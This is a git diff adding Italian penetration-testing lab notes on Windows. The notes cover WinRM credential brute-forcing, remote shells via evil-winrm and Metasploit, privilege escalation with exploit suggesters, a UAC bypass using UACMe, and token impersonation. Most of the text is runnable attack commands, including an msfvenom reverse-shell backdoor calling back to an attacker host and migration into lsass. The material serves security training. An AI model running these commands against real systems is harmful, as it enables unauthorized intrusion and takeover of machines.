@@ -264,3 +264,239 @@ Aspettiamo di capire se sta funzionando, ha settato la dimensione del CHUNK groo
 **In casi reali in cui abbiamo come target un sistema di una azienda bisogna assolutamente fare attenzione ad avviare degli exploit che sfruttano il kernel. Perché possono causare crash e perdite di memoria.**
 {% endhint %}
 
+### Exploiting WinRM
+
+#### Verificare se il servizio WinRM è attivo
+
+```
+nmap -sV -p 5985 10.2.18.45
+```
+
+Le porte di WinRM sono escluse dalle 1000 porte più comuni per cui nmap fa lo scan di default.
+
+#### Crackmapexec: Bruteforce credenziali WinRM
+
+```
+crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+Possiamo usarlo anche per mssql, smb e ssh.
+
+#### Bruteforce credenziali con modulo Metasploit
+
+```
+msfconsole -q
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS demo.ine.local
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set PASSWORD anything
+exploit
+```
+
+#### Crackmapexec: Eseguire comandi sul target
+
+```
+crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"
+crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "systeminfo"
+```
+
+#### evil-winrm: Ottenere una sessione shell sul target
+
+```
+evil-winrm.rb -u administrator -p tinkerbell -i 10.2.18.45
+```
+
+#### Ottenere una meterpreter shell con modulo MSF
+
+```
+service postgresql start && msfconsole
+search winrm_script
+use exploit/windows/winrm/winrm_script_exec
+show options
+set RHOSTS 10.2.18.45
+set FORCE_VBS true
+set USERNAME administrator
+set PASSWORD tinkerbell
+exploit
+```
+
+## Windows Privilege Escalation
+
+### Windows Kernel Exploits
+
+#### Privilege Escalation automatica con MSF
+
+In una sessione meterpreter shell digitare:
+
+```
+getsystem
+```
+
+#### Modulo MSF per suggerire exploit
+
+Avviandolo ci mostra tutte le vulnerabilità presenti in questa versione di windows, e mostrerà poi i moduli MSF per poter elevare i privilegi.
+
+```
+search suggester
+use post/multi/recon/local_exploit_suggester
+show options
+sessions
+set SESSION 3 //essendo un modulo per post exploitation inserire la sessione attiva da usare
+run
+```
+
+Questi moduli possono essere usati dopo aver fatto una ricerca di quali versioni di windows sono vulnerabili e se la nostra del target è tra quelle.
+
+Se fa uso del subsystem capiamo che si tratta di kernel exploit. Es. exploit/windows/local/ms16\_014\_wmi\_recv\_notif)
+
+#### Utilizzare un modulo exploit suggerito per fare privesc automatica con MSF
+
+```
+use exploit/windows/local/ms16_014_wmi_recv_notif
+set SESSION 3
+set LPORT 4422 //in questo caso perché c'era una sessione attiva sulla porta 4444 preimpostata da MSF
+exploit
+```
+
+#### Windows Exploit Suggester: Privesc manuale
+
+1. Clonare Windows-Exploit-Suggester sul proprio ambiente
+2. Aggiornare il db con **./windows-exploit-suggester.py --update**
+3. Eseguire un comando systeminfo sul sistem target a cui abbiamo accesso non privilegiato e copiare l'output in un file
+4. Eseguire il tool passandogli come argomento il database aggiornato e l'output di systeminfo: **./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt**
+
+Per maggiori informazioni riferirsi agli appunti più dettagliati.
+
+Di seguito solo un estratto di come installare il tool e aggiornarlo:
+
+```
+sessions
+sessions 3
+getuid
+shell
+systeminfo
+//copiamo il contenuto in un file, ad esempio aprendo un nuovo terminale ed eseguendo:
+    cd Desktop
+    vim win7.txt
+    //incolla il contenuto
+    :wq
+    cd Windows-Enum/Windows-Exploit-Suggester //cartella dove abbiamo clonato il tool
+    ./windows-exploit-suggester.py --update
+    ./windows-exploit-suggester.py --database 2021-12-26.mssb.xls --system info /Desktop/win7.tzt
+```
+
+### Bypassare UAC con UACMe
+
+#### Exploit vulnerabilità webserver HFS 2.3 per avere accesso al target <a href="#exploit-vulnerabilita-webserver-hfs-2.3-per-avere-accesso-al-target" id="exploit-vulnerabilita-webserver-hfs-2.3-per-avere-accesso-al-target"></a>
+
+```
+service postgresql start && msfconsole
+setg RHOSTS 10.2.22.220
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec
+show options
+// Eventualmente settare TARGETURI ma in questo caso il servizio vulnerabile gira sulla root del webserver
+exploit
+```
+
+#### Dopo aver avuto accesso alla vittima
+
+```
+sysinfo //versione windows e vediamo che meterpreter gira su un processo a 32 bit
+pgrep explorer //es. risultato 2448
+migrate 2448 //Migriamo la meterpreter shell su un processo a 64 bit
+sysinfo
+getuid
+getprivs
+shell
+net user //ci fa vedere che account ci sono
+net localgroup administrators //vediamo che l'utente admin fa parte del gruppo
+net user admin password123 //ci da errore perché dobbiamo bypassare UAC
+
+```
+
+#### UACMe
+
+Compilare il file eseguibile akagi32 o akagi64 (Akagai64) [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
+
+#### Attacco con msfvenom + UACMe per bypassare l'UAC
+
+1. Generiamo un meterpeter payload con msfvenom
+2. Lo trasferiamo al target
+3. Usiamo l'akagai executable con la Key (metodo) numero 23
+4. Eseguiamo il meterpreter payload che dovrebbe bypassare l'UAC
+5. Ci verrà fornita una elevated meterpreter session sul nostro listener
+
+**Passo 1: Generare un payload e aprire il listener**
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
+//LHOST è il nostro IP attaccante
+ls
+msfconsole //apriamo una nuova sessione MSF per impostare un listneer
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.5.2
+set LPORT 1234
+run
+// e qui rimane in attesa di qualche collegamento, rimane listening. 
+// Cambiamo finestra del terminale per fare le prossime operazioni
+```
+
+**Passo 2: Caricare il payload sul target ed eseguirlo per ricevere una reverse shell**
+
+<pre><code><strong>// Torniamo sulla sessione meterpreter aperta tramite l'exploit di prima, dove siamo utenti admin sul target
+</strong><strong>pwd
+</strong>getuid
+getprivs
+cd C:\\
+mkdir Temp
+cd Temp
+upload backdoor.exe
+upload /root/Desktop/tools/UACME/Akagai64.exe
+shell
+dir
+.\Akagi64.exe 23 C:\Temp\backdoor.exe
+</code></pre>
+
+**Passo 3: Sessione con privilegi elevati aperta tramite reverse shell**
+
+```
+sysinfo //connessione aperta correttamente, processo a 32bit
+getuid //siamo sempre utenti admin
+getprivs //abbiamo ora molti più privilegi
+ps //guardiamo i processi attivi, e possiamo migrare a quelli SYSTEM
+migrate 688 //processo di lsass eseguito come SYSTEM
+sysinfo //siamo passati a un processo a 64 bit, quello di lsass
+getuid //abbiamo ora NT AUTHORITY\SYSTEM
+```
+
+### Access Token Impersonation
+
+Possibile se presente il privilegio: **SeImpersonatePrivilege**
+
+#### Ottenere accesso iniziale al target
+
+Viene ripetuto quanto fatto con UAC per avere accesso alla vittima sfruttando una vulnerabilità di Rejetto HFS 2.3, è solo un esempio.
+
+#### Caricare il modulo incognito sul target da meterpreter shell
+
+```
+load incognito
+list_tokens -u
+impersonate_token "ATTACKDEFENSE\Administrator"  //tra gli elencati dal comando sopra
+getuid
+getprivs
+pgrep explorer
+migrate 3512  //ID processo explorer
+getprivs
+getuid
+```
+
+Una volta ottenuto accesso come Administrator possiamo passare anche ad altri token
+
+```
+impersonate_token "NT AUTHORITY SYSTEM"
+```
